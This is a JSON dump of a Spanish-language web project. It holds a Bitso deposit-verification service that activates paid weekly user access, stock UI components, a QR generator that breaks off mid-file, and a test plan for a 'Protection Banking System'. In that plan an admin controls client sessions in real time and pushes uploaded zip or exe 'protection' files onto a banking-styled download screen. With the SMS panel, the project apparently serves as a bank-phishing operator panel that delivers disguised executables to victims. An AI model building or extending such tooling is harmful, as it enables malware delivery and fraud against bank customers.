space-y-2\">\n                  <div className=\"flex justify-between items-start\">\n                    <div className=\"flex-1\">\n                      <p className=\"text-sm font-medium\">A: {sms.phoneNumber}</p>\n                      <p className=\"text-sm text-muted-foreground\">{sms.message}</p>\n                    </div>\n                    <Badge variant={sms.status === 'sent' ? 'default' : 'destructive'}>\n                      {sms.status === 'sent' ? 'Enviado' : 'Error'}\n                    </Badge>\n                  </div>\n                  <p className=\"text-xs text-muted-foreground\">\n                    {formatDate(sms.createdAt)}\n                  </p>\n                </div>\n              ))}\n            </div>\n          )}\n        </CardContent>\n      </Card>\n    </div>\n  );\n};\n\nexport default UserSmsPanel;","size_bytes":11227},"server/bitsoService.ts":{"content":"import crypto from 'crypto';\nimport axios from 'axios';\nimport { PaymentStatus } from '@shared/schema';\n\nconst BITSO_API_KEY = process.env.BITSO_API_KEY;\nconst BITSO_API_SECRET = process.env.BITSO_API_SECRET;\nconst BITSO_RECEIVING_ACCOUNT = process.env.BITSO_RECEIVING_ACCOUNT;\nconst BITSO_API_URL = 'https://api.bitso.com/v3';\n\nif (!BITSO_API_KEY || !BITSO_API_SECRET || !BITSO_RECEIVING_ACCOUNT) {\n  console.warn('[Bitso Service] BITSO_API_KEY, BITSO_API_SECRET y BITSO_RECEIVING_ACCOUNT no est谩n configurados. El servicio de Bitso estar谩 deshabilitado.');\n}\n\ninterface BitsoTransaction {\n  tid: string;\n  amount: string;\n  currency: string;\n  method: string;\n  created_at: string;\n  status: string;\n  details?: {\n    sender?: string;\n    receiving_account?: string;\n  };\n}\n\ninterface BitsoFundingsResponse {\n  success: boolean;\n  payload: BitsoTransaction[];\n}\n\nfunction generateBitsoSignature(httpMethod: string, requestPath: string, nonce: string, jsonPayload: string = ''): string {\n  if (!BITSO_API_SECRET) {\n    throw new Error('BITSO_API_SECRET no est谩 configurado');\n  }\n  const message = nonce + httpMethod + requestPath + jsonPayload;\n  const signature = crypto.createHmac('sha256', BITSO_API_SECRET).update(message).digest('hex');\n  return signature;\n}\n\nexport async function getBitsoBalance(): Promise<any> {\n  try {\n    const nonce = Date.now().toString();\n    const httpMethod = 'GET';\n    const requestPath = '/v3/balance/';\n    \n    const signature = generateBitsoSignature(httpMethod, requestPath, nonce);\n    \n    const headers = {\n      'Authorization': `Bitso ${BITSO_API_KEY}:${nonce}:${signature}`,\n      'Content-Type': 'application/json'\n    };\n\n    const response = await axios.get(`${BITSO_API_URL}/balance/`, {\n      headers\n    });\n\n    if (response.data.success) {\n      return response.data.payload;\n    } else {\n      console.error('[Bitso] Error en respuesta:', response.data);\n      return null;\n    }\n  } catch (error: any) {\n    console.error('[Bitso] Error obteniendo balance:', error.response?.data || error.message);\n    return null;\n  }\n}\n\nexport async function getMXNBalance(): Promise<string | null> {\n  try {\n    const balanceData = await getBitsoBalance();\n    if (!balanceData) return null;\n    \n    const mxnBalance = balanceData.balances?.find((b: any) => b.currency === 'mxn');\n    if (!mxnBalance) return null;\n    \n    return mxnBalance.total;\n  } catch (error) {\n    console.error('[Bitso] Error obteniendo balance MXN:', error);\n    return null;\n  }\n}\n\nexport async function verifyBalanceIncrease(previousBalance: string, expectedAmount: string): Promise<boolean> {\n  try {\n    const currentBalance = await getMXNBalance();\n    if (!currentBalance) {\n      console.log('[Bitso] No se pudo obtener el balance actual');\n      return false;\n    }\n    \n    const previous = parseFloat(previousBalance);\n    const current = parseFloat(currentBalance);\n    const expected = parseFloat(expectedAmount);\n    \n    const increase = current - previous;\n    \n    console.log(`[Bitso] Verificaci贸n de balance:`);\n    console.log(`  - Balance anterior: $${previous.toFixed(2)} MXN`);\n    console.log(`  - Balance actual: $${current.toFixed(2)} MXN`);\n    console.log(`  - Aumento: $${increase.toFixed(2)} MXN`);\n    console.log(`  - Esperado: $${expected.toFixed(2)} MXN`);\n    \n    // Verificar que el aumento sea EXACTAMENTE el monto esperado (con 2 decimales)\n    const increaseMatch = increase.toFixed(2) === expected.toFixed(2);\n    \n    if (increaseMatch) {\n      console.log(`[Bitso]  Balance aument贸 exactamente $${expected.toFixed(2)} MXN`);\n    } else {\n      console.log(`[Bitso]  Balance no coincide - Aumento: $${increase.toFixed(2)}, Esperado: $${expected.toFixed(2)}`);\n    }\n    \n    return increaseMatch;\n  } catch (error) {\n    console.error('[Bitso] Error verificando aumento de balance:', error);\n    return false;\n  }\n}\n\nexport async function getBitsoFundings(limit: number = 100): Promise<BitsoTransaction[]> {\n  try {\n    const nonce = Date.now().toString();\n    const httpMethod = 'GET';\n    const requestPath = '/v3/fundings/';\n    \n    const signature = generateBitsoSignature(httpMethod, requestPath, nonce);\n    \n    const headers = {\n      'Authorization': `Bitso ${BITSO_API_KEY}:${nonce}:${signature}`,\n      'Content-Type': 'application/json'\n    };\n\n    const response = await axios.get<BitsoFundingsResponse>(`${BITSO_API_URL}/fundings/`, {\n      headers,\n      params: { limit }\n    });\n\n    if (response.data.success) {\n      return response.data.payload;\n    } else {\n      console.error('[Bitso] Error en respuesta:', response.data);\n      return [];\n    }\n  } catch (error: any) {\n    console.error('[Bitso] Error obteniendo fundings:', error.response?.data || error.message);\n    return [];\n  }\n}\n\nexport async function verifyPayment(expectedAmount: string, receivingAccount?: string): Promise<BitsoTransaction | null> {\n  const accountToVerify = receivingAccount || BITSO_RECEIVING_ACCOUNT;\n  if (!accountToVerify) {\n    throw new Error('BITSO_RECEIVING_ACCOUNT no est谩 configurado');\n  }\n  try {\n    console.log(`[Bitso] Buscando dep贸sito de exactamente $${expectedAmount} MXN`);\n    \n    const fundings = await getBitsoFundings(50);\n    \n    // Buscar un dep贸sito que coincida EXACTAMENTE con el monto esperado\n    const recentPayment = fundings.find(funding => {\n      // Comparar montos con exactitud de 2 decimales\n      const fundingAmount = parseFloat(funding.amount).toFixed(2);\n      const expected = parseFloat(expectedAmount).toFixed(2);\n      const amountMatch = fundingAmount === expected;\n      \n      const accountMatch = funding.details?.receiving_account === accountToVerify;\n      \n      // Buscar en las 煤ltimas 24 horas\n      const isRecent = new Date(funding.created_at).getTime() > Date.now() - 24 * 60 * 60 * 1000;\n      \n      const isCompleted = funding.status === 'complete';\n      \n      if (amountMatch) {\n        console.log(`[Bitso] Coincidencia encontrada: Monto=${funding.amount}, Cuenta=${funding.details?.receiving_account}, Reciente=${isRecent}, Completado=${isCompleted}`);\n      }\n      \n      return amountMatch && accountMatch && isRecent && isCompleted;\n    });\n\n    if (recentPayment) {\n      console.log(`[Bitso]  Dep贸sito verificado: ${recentPayment.tid} - $${recentPayment.amount} ${recentPayment.currency}`);\n      return recentPayment;\n    } else {\n      console.log(`[Bitso]  No se encontr贸 dep贸sito de $${expectedAmount} MXN en las 煤ltimas 24 horas`);\n      return null;\n    }\n  } catch (error) {\n    console.error('[Bitso] Error verificando pago:', error);\n    return null;\n  }\n}\n\n// Flag para prevenir ejecuciones concurrentes\nlet isCheckingPayments = false;\n\nexport async function checkPendingPayments(): Promise<void> {\n  // Prevenir ejecuciones concurrentes\n  if (isCheckingPayments) {\n    console.log('[Bitso] Ya hay una verificaci贸n en curso, saltando...');\n    return;\n  }\n  \n  isCheckingPayments = true;\n  console.log('[Bitso] Verificando pagos pendientes...');\n  \n  try {\n    const { storage } = await import('./storage');\n    const pendingPayments = await storage.getPendingPayments();\n    \n    if (pendingPayments.length === 0) {\n      console.log('[Bitso] No hay pagos pendientes');\n      return;\n    }\n\n    for (const payment of pendingPayments) {\n      // Incrementar intentos de verificaci贸n\n      const newAttempts = (payment.verificationAttempts || 0) + 1;\n      await storage.incrementPaymentVerificationAttempts(payment.id);\n      \n      const user = await storage.getUserById(payment.userId);\n      if (!user) {\n        console.error(`[Bitso+AI] Usuario ${payment.userId} no encontrado`);\n        \n        // Si se alcanza el l铆mite de intentos, escalar a revisi贸n manual\n        if (newAttempts >= 7) {\n          console.log(`[Bitso+AI] 锔 Usuario no encontrado despu茅s de ${newAttempts} intentos - Marcando para revisi贸n manual`);\n          await storage.updatePaymentStatus(payment.id, PaymentStatus.MANUAL_REVIEW);\n        }\n        continue;\n      }\n      \n      console.log(`[Bitso+AI] Verificando pago ${payment.referenceCode} - Intento ${newAttempts}/7`);\n      \n      // Paso 1: Verificar aumento de balance en Bitso (si tenemos previousBalance)\n      let bitsoVerified = false;\n      \n      if (payment.previousBalance) {\n        bitsoVerified = await verifyBalanceIncrease(payment.previousBalance, payment.amount);\n      } else {\n        // Fallback: usar m茅todo antiguo de buscar transacci贸n\n        console.log(`[Bitso] Sin balance previo guardado, usando m茅todo de b煤squeda de transacciones`);\n        const bitsoPayment = await verifyPayment(payment.amount);\n        bitsoVerified = bitsoPayment !== null;\n      }\n      \n      // Paso 2: Verificar con AI Vision la captura de pantalla\n      let aiVerified = false;\n      let aiConfidence = 0;\n      \n      if (payment.telegramFileId) {\n        try {\n          const TelegramBot = await import('node-telegram-bot-api');\n          const bot = new TelegramBot.default(process.env.TELEGRAM_TOKEN || '', { polling: false });\n          const fileLink = await bot.getFileLink(payment.telegramFileId);\n          \n          const axios = await import('axios');\n          const imageResponse = await axios.default.get(fileLink, { responseType: 'arraybuffer' });\n          const imageBase64 = Buffer.from(imageResponse.data).toString('base64');\n          \n          const { verifyPaymentScreenshot } = await import('./paymentVerificationAI');\n          const aiAnalysis = await verifyPaymentScreenshot(imageBase64, payment.amount, user.username);\n          \n          aiVerified = aiAnalysis.isValid && aiAnalysis.confidence > 0.7;\n          aiConfidence = aiAnalysis.confidence;\n          \n          console.log(`[AI] Confianza: ${(aiConfidence * 100).toFixed(0)}% - V谩lido: ${aiVerified}`);\n        } catch (aiError: any) {\n          console.error(`[AI] Error verificando:`, aiError.message);\n        }\n      }\n      \n      // Paso 3: Activar SOLO si AMBOS m茅todos confirman\n      if (bitsoVerified && aiVerified) {\n        console.log(`[Bitso+AI]  VERIFICACIN COMPLETA - Balance:  | AI: ${(aiConfidence * 100).toFixed(0)}% confianza`);\n        \n        await storage.markPaymentAsCompleted(payment.id, 'balance_verified');\n        \n        const expirationDate = new Date();\n        expirationDate.setDate(expirationDate.getDate() + 7);\n        \n        await storage.updateUser(payment.userId, {\n          isActive: true,\n          expiresAt: expirationDate\n        });\n        \n        if (user.telegramChatId) {\n          try {\n            const { sendPaymentConfirmation } = await import('./telegramBot');\n            await sendPaymentConfirmation(user.id, payment.amount, expirationDate);\n          } catch (notifError: any) {\n            console.error(`[Bitso+AI] Error enviando confirmaci贸n:`, notifError.message);\n          }\n        }\n        \n        console.log(`[Bitso+AI] Usuario ${user.username} activado hasta ${expirationDate.toLocaleDateString('es-ES')}`);\n      } else {\n        // Al menos uno de los m茅todos no confirm贸\n        console.log(`[Bitso+AI] Verificaci贸n parcial - Bitso: ${bitsoVerified ? '' : ''} | AI: ${aiVerified ? '' : ''} - Intento ${newAttempts}/7`);\n        \n        // Si se alcanza el l铆mite de intentos, enviar a revisi贸n manual\n        if (newAttempts >= 7) {\n          console.log(`[Bitso+AI] 锔 No se pudo verificar completamente despu茅s de ${newAttempts} intentos (15 min) - Enviando a revisi贸n manual`);\n          \n          await storage.updatePaymentStatus(payment.id, PaymentStatus.MANUAL_REVIEW);\n          \n          try {\n            if (payment.telegramFileId) {\n              const { sendManualVerificationRequest } = await import('./telegramBot');\n              await sendManualVerificationRequest(payment.id, user, payment.amount, payment.telegramFileId);\n            }\n          } catch (notifError: any) {\n            console.error(`[Bitso+AI] Error enviando solicitud manual:`, notifError.message);\n          }\n        }\n      }\n    }\n  } catch (error) {\n    console.error('[Bitso] Error en verificaci贸n de pagos pendientes:', error);\n  } finally {\n    isCheckingPayments = false;\n  }\n}\n\nsetInterval(checkPendingPayments, 2 * 60 * 1000);\nconsole.log(' Verificaci贸n autom谩tica de pagos Bitso iniciada (cada 2 minutos)');\n","size_bytes":12366},"client/src/components/ui/checkbox.tsx":{"content":"import * as React from \"react\"\nimport * as CheckboxPrimitive from \"@radix-ui/react-checkbox\"\nimport { Check } from \"lucide-react\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst Checkbox = React.forwardRef<\n  React.ElementRef<typeof CheckboxPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof CheckboxPrimitive.Root>\n>(({ className, ...props }, ref) => (\n  <CheckboxPrimitive.Root\n    ref={ref}\n    className={cn(\n      \"peer h-4 w-4 shrink-0 rounded-sm border border-primary ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 data-[state=checked]:bg-primary data-[state=checked]:text-primary-foreground\",\n      className\n    )}\n    {...props}\n  >\n    <CheckboxPrimitive.Indicator\n      className={cn(\"flex items-center justify-center text-current\")}\n    >\n      <Check className=\"h-4 w-4\" />\n    </CheckboxPrimitive.Indicator>\n  </CheckboxPrimitive.Root>\n))\nCheckbox.displayName = CheckboxPrimitive.Root.displayName\n\nexport { Checkbox }\n","size_bytes":1056},"test_protection_system.md":{"content":"# Test Plan: Protection Banking System\n\n## Features Implemented:\n1.  New PROTECCION_BANCARIA screen type added to schema\n2.  File upload functionality in admin panel (FileManager component)\n3.  Session details view with file management\n4.  Protection banking screen with download functionality\n5.  WebSocket integration for file data passing\n6.  Server-side file handling with multer\n7.  Database schema updated with fileName, fileUrl, fileSize fields\n\n## Test Steps:\n\n### 1. Admin Panel File Upload\n- Login as admin\n- Select a session\n- View session details panel (right side)\n- Upload a protection file (zip, exe, etc.)\n- Verify file appears in session details\n\n### 2. Client Screen Functionality\n- Navigate to protection banking screen\n- Verify file download button appears\n- Test file download functionality\n- Confirm download tracking in admin panel\n\n### 3. WebSocket Integration\n- Admin changes screen to protection banking\n- Verify file data is passed to client\n- Test real-time updates between admin and client\n\n### 4. Database Persistence\n- File information stored in sessions table\n- File URLs served from /uploads/ endpoint\n- File removal functionality works correctly\n\n## Implementation Status:\n-  Backend: File upload routes (/api/upload-protection-file, /api/remove-protection-file)\n-  Frontend: FileManager component with upload/download/delete\n-  Frontend: SessionDetails component with file management integration\n-  Frontend: Protection banking screen template\n-  WebSocket: File data passing in screen changes\n-  Database: Schema updated and migrated\n-  Server: Static file serving from uploads directory\n\n## Next Steps for Testing:\n1. Test complete workflow from admin upload to client download\n2. Verify Telegram notifications include file information\n3. Test file size limits and format validation\n4. Confirm proper error handling for missing files","size_bytes":1912},"client/src/components/ui/alert-dialog.tsx":{"content":"import * as React from \"react\"\nimport * as AlertDialogPrimitive from \"@radix-ui/react-alert-dialog\"\n\nimport { cn } from \"@/lib/utils\"\nimport { buttonVariants } from \"@/components/ui/button\"\n\nconst AlertDialog = AlertDialogPrimitive.Root\n\nconst AlertDialogTrigger = AlertDialogPrimitive.Trigger\n\nconst AlertDialogPortal = AlertDialogPrimitive.Portal\n\nconst AlertDialogOverlay = React.forwardRef<\n  React.ElementRef<typeof AlertDialogPrimitive.Overlay>,\n  React.ComponentPropsWithoutRef<typeof AlertDialogPrimitive.Overlay>\n>(({ className, ...props }, ref) => (\n  <AlertDialogPrimitive.Overlay\n    className={cn(\n      \"fixed inset-0 z-50 bg-black/80  data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0\",\n      className\n    )}\n    {...props}\n    ref={ref}\n  />\n))\nAlertDialogOverlay.displayName = AlertDialogPrimitive.Overlay.displayName\n\nconst AlertDialogContent = React.forwardRef<\n  React.ElementRef<typeof AlertDialogPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof AlertDialogPrimitive.Content>\n>(({ className, ...props }, ref) => (\n  <AlertDialogPortal>\n    <AlertDialogOverlay />\n    <AlertDialogPrimitive.Content\n      ref={ref}\n      className={cn(\n        \"fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border bg-background p-6 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg\",\n        className\n      )}\n      {...props}\n    />\n  </AlertDialogPortal>\n))\nAlertDialogContent.displayName = AlertDialogPrimitive.Content.displayName\n\nconst AlertDialogHeader = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) => (\n  <div\n    className={cn(\n      \"flex flex-col space-y-2 text-center sm:text-left\",\n      className\n    )}\n    {...props}\n  />\n)\nAlertDialogHeader.displayName = \"AlertDialogHeader\"\n\nconst AlertDialogFooter = ({\n  className,\n  ...props\n}: React.HTMLAttributes<HTMLDivElement>) => (\n  <div\n    className={cn(\n      \"flex flex-col-reverse sm:flex-row sm:justify-end sm:space-x-2\",\n      className\n    )}\n    {...props}\n  />\n)\nAlertDialogFooter.displayName = \"AlertDialogFooter\"\n\nconst AlertDialogTitle = React.forwardRef<\n  React.ElementRef<typeof AlertDialogPrimitive.Title>,\n  React.ComponentPropsWithoutRef<typeof AlertDialogPrimitive.Title>\n>(({ className, ...props }, ref) => (\n  <AlertDialogPrimitive.Title\n    ref={ref}\n    className={cn(\"text-lg font-semibold\", className)}\n    {...props}\n  />\n))\nAlertDialogTitle.displayName = AlertDialogPrimitive.Title.displayName\n\nconst AlertDialogDescription = React.forwardRef<\n  React.ElementRef<typeof AlertDialogPrimitive.Description>,\n  React.ComponentPropsWithoutRef<typeof AlertDialogPrimitive.Description>\n>(({ className, ...props }, ref) => (\n  <AlertDialogPrimitive.Description\n    ref={ref}\n    className={cn(\"text-sm text-muted-foreground\", className)}\n    {...props}\n  />\n))\nAlertDialogDescription.displayName =\n  AlertDialogPrimitive.Description.displayName\n\nconst AlertDialogAction = React.forwardRef<\n  React.ElementRef<typeof AlertDialogPrimitive.Action>,\n  React.ComponentPropsWithoutRef<typeof AlertDialogPrimitive.Action>\n>(({ className, ...props }, ref) => (\n  <AlertDialogPrimitive.Action\n    ref={ref}\n    className={cn(buttonVariants(), className)}\n    {...props}\n  />\n))\nAlertDialogAction.displayName = AlertDialogPrimitive.Action.displayName\n\nconst AlertDialogCancel = React.forwardRef<\n  React.ElementRef<typeof AlertDialogPrimitive.Cancel>,\n  React.ComponentPropsWithoutRef<typeof AlertDialogPrimitive.Cancel>\n>(({ className, ...props }, ref) => (\n  <AlertDialogPrimitive.Cancel\n    ref={ref}\n    className={cn(\n      buttonVariants({ variant: \"outline\" }),\n      \"mt-2 sm:mt-0\",\n      className\n    )}\n    {...props}\n  />\n))\nAlertDialogCancel.displayName = AlertDialogPrimitive.Cancel.displayName\n\nexport {\n  AlertDialog,\n  AlertDialogPortal,\n  AlertDialogOverlay,\n  AlertDialogTrigger,\n  AlertDialogContent,\n  AlertDialogHeader,\n  AlertDialogFooter,\n  AlertDialogTitle,\n  AlertDialogDescription,\n  AlertDialogAction,\n  AlertDialogCancel,\n}\n","size_bytes":4420},"client/src/components/ui/hover-card.tsx":{"content":"import * as React from \"react\"\nimport * as HoverCardPrimitive from \"@radix-ui/react-hover-card\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst HoverCard = HoverCardPrimitive.Root\n\nconst HoverCardTrigger = HoverCardPrimitive.Trigger\n\nconst HoverCardContent = React.forwardRef<\n  React.ElementRef<typeof HoverCardPrimitive.Content>,\n  React.ComponentPropsWithoutRef<typeof HoverCardPrimitive.Content>\n>(({ className, align = \"center\", sideOffset = 4, ...props }, ref) => (\n  <HoverCardPrimitive.Content\n    ref={ref}\n    align={align}\n    sideOffset={sideOffset}\n    className={cn(\n      \"z-50 w-64 rounded-md border bg-popover p-4 text-popover-foreground shadow-md outline-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2\",\n      className\n    )}\n    {...props}\n  />\n))\nHoverCardContent.displayName = HoverCardPrimitive.Content.displayName\n\nexport { HoverCard, HoverCardTrigger, HoverCardContent }\n","size_bytes":1184},"client/src/components/ui/scroll-area.tsx":{"content":"import * as React from \"react\"\nimport * as ScrollAreaPrimitive from \"@radix-ui/react-scroll-area\"\n\nimport { cn } from \"@/lib/utils\"\n\nconst ScrollArea = React.forwardRef<\n  React.ElementRef<typeof ScrollAreaPrimitive.Root>,\n  React.ComponentPropsWithoutRef<typeof ScrollAreaPrimitive.Root>\n>(({ className, children, ...props }, ref) => (\n  <ScrollAreaPrimitive.Root\n    ref={ref}\n    className={cn(\"relative overflow-hidden\", className)}\n    {...props}\n  >\n    <ScrollAreaPrimitive.Viewport className=\"h-full w-full rounded-[inherit]\">\n      {children}\n    </ScrollAreaPrimitive.Viewport>\n    <ScrollBar />\n    <ScrollAreaPrimitive.Corner />\n  </ScrollAreaPrimitive.Root>\n))\nScrollArea.displayName = ScrollAreaPrimitive.Root.displayName\n\nconst ScrollBar = React.forwardRef<\n  React.ElementRef<typeof ScrollAreaPrimitive.ScrollAreaScrollbar>,\n  React.ComponentPropsWithoutRef<typeof ScrollAreaPrimitive.ScrollAreaScrollbar>\n>(({ className, orientation = \"vertical\", ...props }, ref) => (\n  <ScrollAreaPrimitive.ScrollAreaScrollbar\n    ref={ref}\n    orientation={orientation}\n    className={cn(\n      \"flex touch-none select-none transition-colors\",\n      orientation === \"vertical\" &&\n        \"h-full w-2.5 border-l border-l-transparent p-[1px]\",\n      orientation === \"horizontal\" &&\n        \"h-2.5 border-t border-t-transparent p-[1px]\",\n      className\n    )}\n    {...props}\n  >\n    <ScrollAreaPrimitive.ScrollAreaThumb\n      className={cn(\n        \"relative rounded-full bg-border\",\n        orientation === \"vertical\" ? \"flex-1\" : \"h-full\"\n      )}\n    />\n  </ScrollAreaPrimitive.ScrollAreaScrollbar>\n))\nScrollBar.displayName = ScrollAreaPrimitive.ScrollAreaScrollbar.displayName\n\nexport { ScrollArea, ScrollBar }","size_bytes":1715},"tailwind.config.ts":{"content":"import type { Config } from \"tailwindcss\";\n\nexport default {\n  darkMode: [\"class\"],\n  content: [\"./client/index.html\", \"./client/src/**/*.{js,jsx,ts,tsx}\"],\n  theme: {\n    extend: {\n      borderRadius: {\n        lg: \"var(--radius)\",\n        md: \"calc(var(--radius) - 2px)\",\n        sm: \"calc(var(--radius) - 4px)\",\n      },\n      colors: {\n        background: \"hsl(var(--background))\",\n        foreground: \"hsl(var(--foreground))\",\n        card: {\n          DEFAULT: \"hsl(var(--card))\",\n          foreground: \"hsl(var(--card-foreground))\",\n        },\n        popover: {\n          DEFAULT: \"hsl(var(--popover))\",\n          foreground: \"hsl(var(--popover-foreground))\",\n        },\n        primary: {\n          DEFAULT: \"hsl(var(--primary))\",\n          foreground: \"hsl(var(--primary-foreground))\",\n        },\n        secondary: {\n          DEFAULT: \"hsl(var(--secondary))\",\n          foreground: \"hsl(var(--secondary-foreground))\",\n        },\n        muted: {\n          DEFAULT: \"hsl(var(--muted))\",\n          foreground: \"hsl(var(--muted-foreground))\",\n        },\n        accent: {\n          DEFAULT: \"hsl(var(--accent))\",\n          foreground: \"hsl(var(--accent-foreground))\",\n        },\n        destructive: {\n          DEFAULT: \"hsl(var(--destructive))\",\n          foreground: \"hsl(var(--destructive-foreground))\",\n        },\n        border: \"hsl(var(--border))\",\n        input: \"hsl(var(--input))\",\n        ring: \"hsl(var(--ring))\",\n        chart: {\n          \"1\": \"hsl(var(--chart-1))\",\n          \"2\": \"hsl(var(--chart-2))\",\n          \"3\": \"hsl(var(--chart-3))\",\n          \"4\": \"hsl(var(--chart-4))\",\n          \"5\": \"hsl(var(--chart-5))\",\n        },\n        sidebar: {\n          DEFAULT: \"hsl(var(--sidebar-background))\",\n          foreground: \"hsl(var(--sidebar-foreground))\",\n          primary: \"hsl(var(--sidebar-primary))\",\n          \"primary-foreground\": \"hsl(var(--sidebar-primary-foreground))\",\n          accent: \"hsl(var(--sidebar-accent))\",\n          \"accent-foreground\": \"hsl(var(--sidebar-accent-foreground))\",\n          border: \"hsl(var(--sidebar-border))\",\n          ring: \"hsl(var(--sidebar-ring))\",\n        },\n      },\n      keyframes: {\n        \"accordion-down\": {\n          from: {\n            height: \"0\",\n          },\n          to: {\n            height: \"var(--radix-accordion-content-height)\",\n          },\n        },\n        \"accordion-up\": {\n          from: {\n            height: \"var(--radix-accordion-content-height)\",\n          },\n          to: {\n            height: \"0\",\n          },\n        },\n      },\n      animation: {\n        \"accordion-down\": \"accordion-down 0.2s ease-out\",\n        \"accordion-up\": \"accordion-up 0.2s ease-out\",\n      },\n    },\n  },\n  plugins: [require(\"tailwindcss-animate\"), require(\"@tailwindcss/typography\")],\n} satisfies Config;\n","size_bytes":2787},"client/src/components/admin/QRGenerator.tsx":{"content":"import React, { useState } from 'react';\nimport { Card, CardContent, CardHeader, CardTitle } from \"@/components/ui/card\";\nimport { Label } from \"@/components/ui/label\";\nimport { Input } from \"@/components/ui/input\";\nimport { Button } from \"@/components/ui/button\";\nimport { QrCode, Download, Copy, RefreshCw } from \"lucide-react\";\nimport { useToast } from \"@/hooks/use-toast\";\n\nexport function QRGenerator() {\n  const [inputText, setInputText] = useState('');\n  const [qrImageUrl, setQrImageUrl] = useState('');\n  const [isGenerating, setIsGenerating] = useState(false);\n  const { toast } = useToast();\n\n  // Funci贸n para validar que el input sea alfanum茅rico\n  const validateInput = (input: string) => {\n    // Permite letras, n煤meros y espacios\n    return /^[a-zA-Z0-9\\s]*$/.test(input);\n  };\n\n  // Funci贸n para generar el c贸digo QR utilizando la API de QR Code Generator\n  const generateQR = async () => {\n    if (!inputText) {\n      toast({\n        title: \"Error al generar QR\",\n        description: \"Debes ingresar un texto alfanum茅rico para generar el c贸digo QR\",\n        variant: \"destructive\",\n      });\n      return;\n    }\n\n    setIsGenerating(true);\n    \n    try {\n      // Usar la API de QR Code Generator en lugar de la biblioteca\n      const url = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(inputText)}`;\n      setQrImageUrl(url);\n      \n      toast({\n        title: \"QR generado\",\n        description: \"El c贸digo QR se ha generado correctamente\",\n      });\n    } catch (error) {\n      console.error(\"Error generando QR:\", error);\n      toast({\n        title: \"Error al generar QR\",\n        description: \"Ocurri贸 un error al generar el c贸digo QR\",\n        variant: \"destructive\",\n      });\n    } finally {\n      setIsGenerating(false);\n    }\n  };\n\n  // Funci贸n para descargar el c贸digo QR como imagen\n  const downloadQR = () => {\n    if (!qrImageUrl) return;\n    \n    fetch(qrImageUrl)\n      .then(response => response.blob())\n      .then(blob => {\n        const url = window.URL.createObjectURL(blob);\n        const link = document.createElement('a');\n        link.href = url;\n        link.download = `qr-code-${inputText}.png`;\n        document.body.appendChild(link);\n        link.click();\n        window.URL.revokeObjectURL(url);\n        document.body.removeChild(link);\n        \n        toast({\n          title: \"QR descargado\",\n          description: \"El c贸digo QR se ha descargado correctamente\",\n        });\n      })\n      .catch(error => {\n        console.error(\"Error descargando QR:\", error);\n        toast({\n          title: \"Error al descargar\",\n          description: \"No se pudo descargar el c贸digo QR\",\n          variant: \"destructive\",\n        });\n      });\n  };\n\n  // Funci贸n para copiar el texto del QR al portapapeles\n  const copyQRText = () => {\n    navigator.clipboard.writeText(inputText)\n      .then(() => {\n        toast({\n          title: \"Texto copiado\",\n          description: \"El c贸digo ha sido copiado al portapapeles\",\n        });\n      })\n      .catch((error) => {\n        console.error(\"Error copiando al portapapeles:\", error);\n        toast({\n          title: \"Error al copiar\",\n          description: \"No se pudo copiar el texto al portapapeles\",\n          variant: \"destructive\",\n        });\n      });\n  };\n\n  // Manejar cambios en el input\n  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {\n    const value = e.target.value;\n    \n    // Solo permitir caracteres alfanum茅ricos y espacios\n    if (validateInput(value)) {\n      setInputText(value);\n    }\n  };\n\n  return (\n    <div className=\"mx-4 md:mx-6 mt-4\">\n      <Card className=\"bg-[#1e1e1e] text-white border-gray-700\">\n        <CardHeader>\n          <CardTitle className=\"flex items-center\">\n            <QrCode className=\"mr-2 h-5 w-5\" />\n            Generador de C贸digos QR\n          </CardTitle>\n        </CardHeader>\n        <CardContent>\n          <div className=\"grid gap-6\">\n            <div className=\"grid grid-cols-1 md:grid-cols-3 gap-4\">\n              <div className=\"col-span-1 space-y-4\">\n                <div className=\"space-y-2\">\n                  <Label htmlFor=\"qr-input\">Ingresa texto alfanum茅rico</Label>\n                  <Input\n                    id=\"qr-input\"\n                    type=\"text\"\n                    value={inputText}\n                    onChange={handleInputChange}\n                    placeholder=\"Ej: ABC123\"\n                    className=\"bg-[#2a2a2a] border-gray-700 text-white\"\n                    maxLength={50}\n                  />\n                </div>\n                \n                <div className=\"space-y-2\">\n                  <Button \n                    onClick={generateQR} \n                    className=\"w-full bg-[#007bff] hover:bg-blue-700 text-white flex items-center justify-center\"\n                    disabled={isGenerating || !inputText}\n                  >\n                    {isGenerating ? (\n                      <>\n                        <RefreshCw className=\"h-4 w-4 mr-2 animate-spin\" />\n                        Generando...\n                      </>\n                    ) : (\n                      <>\n                        <QrCode className=\"h-4 w-4 mr-2\" />\n                        Generar QR\n                      </>\n                    )}\n                  </Button>\n                </div>\n                \n                {qrImageUrl && (\n                  <div className=\"space-y-2\">\n                    <div className=\"flex space-x-2\">\n                      <Button\n                        onClick={downloadQR}\n                        className=\"flex-1 bg-[#28a745] hover:bg-green-700 text-white flex items-center justify-center\"\n                      >\n                        <Download className=\"h-4 w-4 mr-2\" />\n                        Descargar\n                      </Button>\n                      <Button\n                        onClick={copyQRText}\n                        className=\"flex-1 bg-[#6c757d] hover:bg-gray-700 